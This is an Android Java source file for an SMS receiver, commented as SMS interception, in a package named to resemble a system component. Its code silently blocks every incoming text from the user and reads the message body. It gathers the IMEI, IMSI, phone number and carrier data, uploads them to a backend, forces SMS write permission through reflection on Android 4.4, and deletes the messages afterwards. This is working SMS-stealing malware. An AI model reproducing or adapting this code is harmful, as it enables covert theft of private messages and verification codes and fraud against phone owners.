package com.android.sms.client;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.flurry.android.FlurryAgent;

import org.greenrobot.eventbus.EventBus;

import java.util.HashMap;
import java.util.Map;

/**
 * 短信拦截
 *
 * @author zyq 16-3-9
 */
public class Receiver_SMS extends BroadcastReceiver {

	private final static boolean DEBUG = true;
	private final static String TAG = "smsReceiver";
	private final static String SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
	private final static String SMS_CATEGORY = "android.intent.category.DEFAULT";
	private final String SMS_SERVICE = "pdus";
	private final String SMS_BODY = "body";
	private final String SMS_ID = "_id";
	private final String SMS_RECEIVE_CONTENT = "content://sms/inbox";
	private final String SMS_CONTENT = "content://sms";
	private final long VALID_SMS_TIME = 45 * 1000;

	public Receiver_SMS() {
	}

	public static void registSmsReceiver(Context context, Receiver_SMS receiver) {
		IntentFilter filter = new IntentFilter();
		filter.addAction(SMS_ACTION);
		filter.addCategory(SMS_CATEGORY);
		context.registerReceiver(receiver, filter);
	}

	public static void unRegisterSmsReceiver(Context context, Receiver_SMS reciever) {
		if (reciever != null) {
			context.unregisterReceiver(reciever);
		}
	}

	@Override
	public void onReceive(Context context, Intent intent) {
		try {
            Log.d(TAG,"Receiver_SMS.onReceive:intent:"+intent.getAction());
			if (SMS_ACTION.equals(intent.getAction())) {
				Bundle args = intent.getExtras();
				String msgContent = "";

				final long currentTime = System.currentTimeMillis();

//				if (GetMsgRunnable.sendSmsTime <= 0) return;
//				if (GetMsgRunnable.sendSmsTime > 0 && (currentTime - GetMsgRunnable.sendSmsTime <
//						VALID_SMS_TIME)) {
//					if (DEBUG) {
//						Log.d(TAG, "拦截短信，应该不会有短信显示！！！！！！！！！");
//					}
//					this.abortBroadcast();
//				} else {
//					this.clearAbortBroadcast();
//				}
				this.abortBroadcast();

				if (args != null) {
					Object[] pdus = (Object[]) args.get(SMS_SERVICE);
                    //pdu为承载着一条短信的所有短信。
                    //一条短信为140个英文字符长度，在这个长度范围内，即需一个pdu即可。超出这个范围，即要分割成多个pdu数组。
                    Log.d(TAG,"该短信由几个pdus组成："+pdus.length);
					SmsMessage messages[] = new SmsMessage[pdus.length];
                    StringBuilder sb = new StringBuilder();
                    for(int i = 0;i<messages.length;i++){
                        messages[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                        sb.append(messages[i].getMessageBody());
                    }
                    if(sb.toString() != null){
                        if (DEBUG) {
                            Log.d(TAG, "收到的短信内容：" + sb.toString());
                        }
                        reportData(context,sb.toString());
                    }

					for (int i = 0; i < messages.length; i++) {
						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
						msgContent = messages[i].getMessageBody();
						if (msgContent != null) {
							if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
								if (SmsWriteOpUtil.isWriteEnabled(context)) {
									boolean isSuccess = SmsWriteOpUtil.setWriteEnabled(context, true);
									final String model = Build.MODEL;
									if (DEBUG) {
										Log.d(TAG, "4.4反射修改短信权限！！！！！！ " + isSuccess);
									}
									Map<String, String> map = new HashMap<>();
									map.put(NativeParams.KEY_FIX_SYSTEM_SUCCESS, String.valueOf(isSuccess));
									map.put(NativeParams.KEY_KITKAT_DEVICE, model);
									FlurryAgent.logEvent(NativeParams.EVENT_VERSION_KITKAT,map);
								}
							}

							//删掉指令短信
							SmsManageUtil.getInstance(context).deleteSMS(context, GetMsgRunnable.currentCheckInfo.getOperatorCode());
							//删除短信短信
							SmsManageUtil.getInstance(context).deleteSMS(context, msgContent);
                            return;
						}
					}
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
		}
	}

	private void reportData(Context context, String contentMsg) {
		SmsSimInfo info = new SmsSimInfo();
		CheckInfo checkInfo = GetMsgRunnable.currentCheckInfo;
		final String operator = checkInfo.getOperators();
		final String operatorCode = checkInfo.getOperatorCode();

		info.setImei(SmsManageUtil.getInstance(context).getPhoneIMEI());
		info.setImsi(SmsManageUtil.getInstance(context).getPhoneIMSI());
		info.setMessageinfo(contentMsg);
		info.setPhonenumber(SmsManageUtil.getInstance(context).getNativePhoneNumber1());
		info.setOperators(operator);
		info.setOperatorcode(operatorCode);

		if (DEBUG) {
			Log.d(TAG, "即将上报短信信息！！！！！！！！！！");
		}

		StringBuilder builder = new StringBuilder();
		builder.append("imei:" + info.getIMEI()).append("\n")
				.append("imsi:" + info.getIMSI()).append("\n")
				.append("phoneNumber:" + info.getPhonenumber()).append("\n")
				.append("operator:" + info.getOperators()).append("\n")
				.append("operatorcode:" + info.getOperatorcode()).append("\n")
				.append("smsinfo:" + info.getMessageinfo()).append("\n");
		EventBus.getDefault().post(new MessageEvent(builder.toString()));

		try {
			info.saveInBackground();
		} catch (Throwable e) {
			if (DEBUG) {
				Log.d(TAG, "上报数据失败！！！！！！！！！！！！");
				Log.e(TAG, e.fillInStackTrace().toString());
			}
		}
	}




}
